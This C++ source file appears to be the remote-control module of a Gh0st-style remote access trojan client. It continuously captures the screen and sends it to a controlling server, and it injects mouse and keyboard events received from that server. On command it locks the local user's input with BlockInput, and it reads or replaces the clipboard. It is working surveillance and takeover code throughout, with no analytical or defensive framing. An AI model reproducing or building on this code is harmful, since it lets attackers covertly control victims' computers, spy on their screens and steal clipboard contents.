#include "ClientRemoteControll.h"
#include "Common.h"

CClientRemoteControll::CClientRemoteControll(CIOCPClient* ClientObject) :CManager(ClientObject)
{
	
	m_IsLoop = TRUE;
	m_IsBlockInput = FALSE;
	m_ScreenSpyObject = new CScreenSpy(16);

	if (m_ScreenSpyObject == NULL)
	{
		return;
	}

	m_ThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProcedure, this, 0, NULL);


}
DWORD WINAPI CClientRemoteControll::ThreadProcedure(LPVOID ParameterData)
{

	CClientRemoteControll *This = (CClientRemoteControll *)ParameterData;


	This->SendBitmapInfo();           //发送bmp位图结构
									  //等主控端对话框打开
   
	This->WaitForServerDialogOpen();

	This->SendFirstScreenBufferData();
	while (This->m_IsLoop)
	{

		This->SendNextScreenBufferData();

		Sleep(10);
	}

	printf("远程控制ThreadProcedure函数\r\n");

	return 0;
}

CClientRemoteControll::~CClientRemoteControll()
{

	m_IsLoop = FALSE;

	WaitForSingleObject(m_ThreadHandle, INFINITE);
	if (m_ThreadHandle != NULL)
	{
		CloseHandle(m_ThreadHandle);
	}

	delete m_ScreenSpyObject;
	m_ScreenSpyObject = NULL;


	printf("远程控制析构函数\r\n");
}
VOID CClientRemoteControll::SendBitmapInfo()
{

	//这里得到bmp结构的大小

	ULONG   BufferLength = 1 + m_ScreenSpyObject->GetBitmapInfoSize();   //大小
	LPBYTE	BufferData = (LPBYTE)VirtualAlloc(NULL,
		BufferLength, MEM_COMMIT, PAGE_READWRITE);

	BufferData[0] = CLIENT_REMOTE_CONTROLL_REPLY;
	//这里将bmp位图结构发送出去
	memcpy(BufferData + 1, m_ScreenSpyObject->GetBitmapInfoData(), BufferLength - 1);
	m_ClientObject->OnServerSending((char*)BufferData, BufferLength);
	VirtualFree(BufferData, 0, MEM_RELEASE);
}
VOID CClientRemoteControll::SendFirstScreenBufferData()
{
	//类CScreenSpy的getFirstScreen函数中得到图像数据
	//然后用getFirstImageSize得到数据的大小然后发送出去
	BOOL	bRet = FALSE;
	LPVOID	BitmapData = NULL;


	BitmapData = m_ScreenSpyObject->GetFirstScreenBufferData();
	if (BitmapData == NULL)
	{
		return;
	}

	ULONG	BufferLength = 1 + m_ScreenSpyObject->GetFirstScreenBufferSize();
	LPBYTE	BufferData = new BYTE[BufferLength];
	if (BufferData == NULL)
	{
		return;
	}

	BufferData[0] = CLIENT_REMOTE_CONTROLL_FIRST_SCREEN;
	memcpy(BufferData + 1, BitmapData, BufferLength - 1);


	m_ClientObject->OnServerSending((char*)BufferData, BufferLength);

	delete[] BufferData;
	BufferData = NULL;
}

VOID CClientRemoteControll::SendNextScreenBufferData()
{
	//得到数据，得到数据大小，然后发送
	//我们到getNextScreen函数的定义 
	LPVOID	BitmapData = NULL;
	ULONG	BufferLength = 0;
	BitmapData = m_ScreenSpyObject->GetNextScreenBufferData(&BufferLength);

	if (BufferLength == 0 || BitmapData == NULL)
	{
		return;
	}

	BufferLength += 1;

	LPBYTE	BufferData = new BYTE[BufferLength];
	if (BufferData == NULL)
	{
		return;
	}
	BufferData[0] = CLIENT_REMOTE_CONTROLL_NEXT_SCREEN;
	memcpy(BufferData + 1, BitmapData, BufferLength - 1);

	m_ClientObject->OnServerSending((char*)BufferData, BufferLength);

	delete[] BufferData;
	BufferData = NULL;
}

void CClientRemoteControll::PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_GO_ON:
	{
		NotifyDialogIsOpen();	
		break;
	}
	case CLIENT_REMOTE_CONTROLL_CONTROL:
	{
		BlockInput(FALSE);   //锁定状态放开  执行消息  恢复原形
		AnalyzeCommand(BufferData + 1, BufferLength - 1);
		BlockInput(m_IsBlockInput);
		break;
	}
	case CLIENT_REMOTE_CONTROLL_BLOCK_INPUT:
	{
		m_IsBlockInput = *(LPBYTE)&BufferData[1];   //鼠标键盘的锁定
		BlockInput(m_IsBlockInput);
		break;
	}
	case CLIENT_REMOTE_CONTROLL_GET_CLIPBOARD_REQUIRE:
	{

		SendClipboard();
		break;
	}
	case CLIENT_REMOTE_CONTROLL_SET_CLIPBOARD_REQUIRE:
	{

		SetClipboard((char*)BufferData + 1, BufferLength - 1);
		break;
	}
	default:
	{	
		break;
	}
	break;
	}
}
VOID CClientRemoteControll::AnalyzeCommand(LPBYTE BufferData, ULONG BufferLength)
{
	// 数据包不合法
	if (BufferLength % sizeof(MSG) != 0)
		return;
	// 命令个数
	ULONG	MsgCount = BufferLength / sizeof(MSG);

	// 处理多个命令
	for (int i = 0; i < MsgCount; i++)   //1
	{
		MSG	*Msg = (MSG*)(BufferData + i * sizeof(MSG));
		switch (Msg->message)
		{
		case WM_LBUTTONDOWN:
		case WM_LBUTTONUP:
		case WM_RBUTTONDOWN:
		case WM_RBUTTONUP:
		case WM_MOUSEMOVE:
		case WM_LBUTTONDBLCLK:
		case WM_RBUTTONDBLCLK:
		case WM_MBUTTONDOWN:
		case WM_MBUTTONUP:
		{
			POINT Point;
			Point.x = LOWORD(Msg->lParam);
			Point.y = HIWORD(Msg->lParam);
			SetCursorPos(Point.x, Point.y);
			SetCapture(WindowFromPoint(Point));  //???
		}
		break;
		default:
			break;
		}

		switch (Msg->message)
		{
		case WM_LBUTTONDOWN:
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
			break;
		case WM_LBUTTONUP:
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDOWN:
			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
			break;
		case WM_RBUTTONUP:
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_LBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_MBUTTONDOWN:
			mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
			break;
		case WM_MBUTTONUP:
			mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
			break;
		case WM_MOUSEWHEEL:
			mouse_event(MOUSEEVENTF_WHEEL, 0, 0,
				GET_WHEEL_DELTA_WPARAM(Msg->wParam), 0);
			break;
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), 0, 0);
			break;
		case WM_KEYUP:
		case WM_SYSKEYUP:
			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), KEYEVENTF_KEYUP, 0);
			break;
		default:
			break;
		}
	}
}
VOID CClientRemoteControll::SendClipboard()
{
	if (!::OpenClipboard(NULL))  //打开剪切板设备
		return;
	HGLOBAL GlobalHandle = GetClipboardData(CF_TEXT);   //代表着一个内存
	if (GlobalHandle == NULL)
	{
		CloseClipboard();
		return;
	}
	int	  BufferLength = GlobalSize(GlobalHandle) + 1;
	char* v5 = (LPSTR)GlobalLock(GlobalHandle);    //锁定 +
	LPBYTE	BufferData = new BYTE[BufferLength];


	BufferData[0] = CLIENT_REMOTE_CONTROLL_GET_CLIPBOARD_REPLY;
	memcpy(BufferData + 1, v5, BufferLength - 1);
	::GlobalUnlock(GlobalHandle);
	::CloseClipboard();
	m_ClientObject->OnServerSending((char*)BufferData, BufferLength);
	delete[] BufferData;
}
VOID CClientRemoteControll::SetClipboard(char *BufferData, ULONG BufferLength)
{
	if (!::OpenClipboard(NULL))
		return;

	::EmptyClipboard();   //清空剪贴板内容
	HGLOBAL GlobalHandle = GlobalAlloc(GPTR, BufferLength);
	if (GlobalHandle != NULL) {

		char*  v5 = (LPTSTR)GlobalLock(GlobalHandle);
		memcpy(v5, BufferData, BufferLength);
		GlobalUnlock(GlobalHandle);
		SetClipboardData(CF_TEXT, GlobalHandle);
		GlobalFree(GlobalHandle);
	}
	::CloseClipboard();
}